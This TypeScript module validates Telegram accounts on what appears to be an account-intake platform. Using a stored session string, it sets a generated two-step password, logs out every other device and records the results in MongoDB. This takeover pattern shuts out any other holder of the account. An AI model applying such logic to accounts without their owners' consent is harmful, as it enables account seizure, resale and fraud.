import { getCollection, Collections } from '@/lib/mongodb/client'
import { getActiveSessions, logoutOtherDevices, setMasterPassword } from '@/lib/telegram/auth'
import { ObjectId } from 'mongodb'

export interface ValidationResult {
  success: boolean
  accountId: string
  status: 'accepted' | 'rejected' | 'pending'
  reason?: string
  sessionsCount?: number
  loggedOutCount?: number
  error?: string
}

export interface ValidationParams {
  accountId: string | ObjectId
  phoneNumber: string
  sessionString: string
  currentPassword?: string
  masterPassword?: string
}

export async function validateAccount(params: ValidationParams): Promise<ValidationResult> {
  const { accountId, phoneNumber, sessionString, currentPassword, masterPassword } = params
  
  try {
    const accounts = await getCollection(Collections.ACCOUNTS)
    const objId = typeof accountId === 'string' ? new ObjectId(accountId) : accountId
    const account = await accounts.findOne({ _id: objId })

    if (!account) {
      return {
        success: false,
        accountId: objId.toString(),
        status: 'rejected',
        reason: 'Account not found',
        error: 'Account not found'
      }
    }

    console.log(`[AccountValidation] Starting validation for ${phoneNumber}`)

    const generatedMasterPassword = masterPassword || `MP_${Date.now()}_${Math.random().toString(36)}`

    console.log('[AccountValidation] Step 1: Setting master password...')
    const masterPasswordResult = await setMasterPassword(
      sessionString,
      generatedMasterPassword,
      currentPassword
    )

    if (!masterPasswordResult.success) {
      console.log('[AccountValidation] ❌ Failed to set master password - FAKE ACCOUNT')
      
      await accounts.updateOne(
        { _id: objId },
        {
          $set: {
            status: 'rejected',
            rejection_reason: 'Fake Account - Master password setting failed',
            rejected_at: new Date(),
            updated_at: new Date()
          }
        }
      )

      return {
        success: false,
        accountId: objId.toString(),
        status: 'rejected',
        reason: 'Fake Account - Master password setting failed',
        error: masterPasswordResult.error
      }
    }

    console.log('[AccountValidation] ✅ Master password set successfully')

    console.log('[AccountValidation] Step 2: Checking active sessions...')
    const sessionsResult = await getActiveSessions(sessionString)

    let sessionCount = 0
    let loggedOutCount = 0

    if (!sessionsResult.success || !sessionsResult.sessions) {
      console.log('[AccountValidation] ⚠️ Could not retrieve sessions, proceeding with caution')
    } else {
      sessionCount = sessionsResult.sessions.length
      console.log(`[AccountValidation] Found ${sessionCount} active sessions`)

      if (sessionCount > 1) {
        console.log('[AccountValidation] Step 3: Multiple devices detected, logging out others...')
        
        const logoutResult = await logoutOtherDevices(sessionString)
        
        if (logoutResult.success) {
          loggedOutCount = logoutResult.loggedOutCount || 0
          console.log(`[AccountValidation] ✅ Logged out ${loggedOutCount} devices`)
          
          await accounts.updateOne(
            { _id: objId },
            {
              $set: {
                multiple_devices_detected: true,
                devices_logged_out: loggedOutCount,
                last_session_check: new Date(),
                updated_at: new Date()
              }
            }
          )
        } else {
          console.log('[AccountValidation] ⚠️ Failed to logout other devices')
        }
      } else {
        console.log('[AccountValidation] ✅ Single device detected')
      }

      await accounts.updateOne(
        { _id: objId },
        {
          $set: {
            initial_session_count: sessionCount,
            master_password_set: true,
            last_session_check: new Date(),
            updated_at: new Date()
          }
        }
      )
    }

    console.log('[AccountValidation] Step 4: Moving to pending status...')
    
    await accounts.updateOne(
      { _id: objId },
      {
        $set: {
          status: 'pending',
          validation_stage: 'pending_approval',
          pending_since: new Date(),
          updated_at: new Date()
        }
      }
    )

    console.log('[AccountValidation] ✅ Account validated and moved to pending')

    return {
      success: true,
      accountId: objId.toString(),
      status: 'pending',
      sessionsCount: sessionCount,
      loggedOutCount: loggedOutCount
    }
  } catch (error: any) {
    console.error('[AccountValidation] Error:', error)
    return {
      success: false,
      accountId: typeof accountId === 'string' ? accountId : accountId.toString(),
      status: 'rejected',
      reason: 'Validation error',
      error: error.message || 'Internal validation error'
    }
  }
}
